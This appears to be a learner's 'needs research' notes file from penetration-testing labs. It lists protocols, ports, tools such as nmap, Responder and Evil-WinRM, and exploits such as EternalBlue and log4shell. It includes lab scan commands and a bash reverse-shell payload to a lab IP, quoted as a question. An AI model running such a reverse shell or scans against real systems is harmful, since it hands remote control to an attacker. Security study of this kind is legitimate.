# Needs research

* OpenSSL. Why [configure like this](https://help.heroku.com/88GYDTB2/how-do-i-configure-openssl-to-allow-the-use-of-legacy-cryptographic-algorithms)?
```bash
for port in $(cat ports9.txt) ; do
  nmap -p $port 10.129.70.15 >> scan.txt
done
grep -i "open" scan.txt
```

* FIFO named pipe.

* What is DNS Lookup, XXE and OAST?

* `sudo nmap --script smb-vuln* -p 445  10.10.10.4` nmap scripts.

* Meterpreter Metasploit.

* WannaCry, EternalBlue, MS17-010.

* What is LDAP, JNDI, analyze log4shell vulnerability deeply.

* Why `nmap -Pn`, block ping probes.

* NTLMv2. NTHash.

* Responder utility. `responder`.

* `/etc/hosts` details. Why putting `IP   website` to resolve connection?

* Evil-WinRM. [Detailed guide](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/). Port 5985, 5896.

* VPN. `openvpn`.

* NMAP.

* `telnet`. Port 23.

* `ftp`. File Transfer Protocol. Port 21.

* SMB. Server Message Block. `samba`, `microsoft-ds`. Port 445, or 139.

* ICMP echo request. `ping`.

* TCP/UDP ports.

* RDP. Remote Desktop Protocol. Port 3389.

* HTTP, HTTPS. `nginx`, `apache`. Port 80.

* MongoDB. No-SQL database. Port 27017, 27018.

* Rsync. `rsync`. Port 873.

* `gobuster`.

* SQL. `mariadb`, `mysql`. Port 3306.

* Where to get better password and directory lists? Search what Kali uses.

* What is the difference between `gobuster` options `vhost` and `dns`?

* What is `netcat` and how does it work?

* DNS servers. Why add arbitrary DNS servers to `/etc/hosts`, such as `8.8.8.8`?

* What the payload `bash -c 'exec bash -i &>/dev/tcp/10.10.14.11/1234 <&1'` does exactly?
